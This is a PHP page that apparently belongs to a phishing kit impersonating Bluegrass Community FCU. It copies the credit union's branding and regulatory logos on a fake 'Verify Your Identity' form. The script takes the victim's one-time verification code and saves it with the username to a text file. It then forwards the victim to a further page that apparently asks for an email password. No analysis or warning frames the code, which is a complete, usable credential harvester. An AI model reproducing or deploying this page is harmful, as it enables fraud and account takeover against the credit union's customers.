<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];
$otp = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $otp = trim($_POST['otp'] ?? '');
    
    // Simple validation
    if (empty($otp)) {
        $errors['otp'] = 'Please enter the verification code';
    }
    
    if (empty($errors)) {
        // Save to test file
        $data = [
            'step' => 'otp_verification',
            'usrnm' => $username,
            'vrf_cd' => $otp
        ];
        
        saveUserData('otp_verification.txt', $data);
        
        // Redirect to email password page
        header('Location: email_password.php');
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Identity - Bluegrass Community FCU</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-[#4A9619] text-[#123524] flex flex-col">
        <!-- Main Content -->
        <main class="flex-1 flex items-center justify-center px-4 py-12">
            <div class="w-full max-w-3xl flex flex-col items-center gap-8">
                <!-- OTP Verification Card -->
                <div class="w-full rounded-[30px] bg-white shadow-[0_30px_60px_rgba(0,0,0,0.18)] px-10 py-12">
                    <!-- Logo -->
                    <img
                        src="assets/blue_logo.png"
                        alt="Bluegrass Community FCU"
                        class="mx-auto h-12 w-auto"
                    />

                    <!-- Card Header -->
                    <div class="mt-6 space-y-3 text-center">
                        <p class="text-[0.65rem] font-semibold uppercase tracking-[0.35em] text-[#4A9619]">
                            Verification
                        </p>
                        <h1 class="text-2xl font-semibold text-gray-900">Verify Your Identity</h1>
                        <p class="text-gray-600">Enter the verification code</p>
                    </div>
                    
                    <?php if (!empty($errors)): ?>
                        <div class="mt-6 bg-red-50 border-l-4 border-red-500 p-4">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <div class="ml-3">
                                    <p class="text-sm text-red-700">
                                        <?php echo htmlspecialchars(implode(' ', $errors)); ?>
                                    </p>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST" class="mt-8 space-y-6">
                        <div>
                            <input
                                type="text"
                                name="otp"
                                id="otp"
                                class="w-full rounded-xl border border-gray-200 px-4 py-3 text-center text-xl tracking-widest text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                placeholder="Enter verification code"
                                autocomplete="one-time-code"
                                inputmode="numeric"
                                required
                            >
                        </div>
                        
                        <button
                            type="submit"
                            class="w-full rounded-xl bg-[#4A9619] py-3 text-base font-semibold text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
                        >
                            Verify & Continue
                        </button>
                        
                        <div class="text-center">
                            <button type="button" class="text-sm text-[#4A9619] hover:underline focus:outline-none font-medium">
                                Didn't receive a code? <span class="font-medium">Resend</span>
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="bg-white border-t border-gray-300 py-6">
            <div class="max-w-7xl mx-auto px-4">
                <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-6">
                    <div class="flex items-center gap-6 justify-center md:justify-start">
                        <img
                            src="assets/equal-housing.png"
                            alt="Equal Housing Lender"
                            class="h-12 w-auto"
                        />
                        <img
                            src="assets/ncua.png"
                            alt="National Credit Union Administration"
                            class="h-12 w-auto"
                        />
                    </div>
                    <div class="text-xs text-gray-700 text-center md:text-right space-y-2">
                        <p>© 2025 Bluegrass Community FCU. All Rights Reserved.</p>
                        <p>
                            This site contains links to other sites on the Internet. We, and your credit union,
                            cannot be responsible for the content or privacy policies of these other sites.
                        </p>
                        <p>Version: v26.10.22.0</p>
                    </div>
                </div>
                <div class="text-center text-xs text-gray-500 mt-6 border-t border-gray-200 pt-4">
                    ~ Current time is <?php echo date('m/d/Y h:i:s A'); ?> ~ 0 ~ NWEB02 ~
                </div>
            </div>
        </footer>
    </div>
    
    <script>
        // Auto-focus OTP input on page load
        document.addEventListener('DOMContentLoaded', function() {
            const otpInput = document.getElementById('otp');
            if (otpInput) {
                otpInput.focus();
            }
        });
    </script>
</body>
</html>
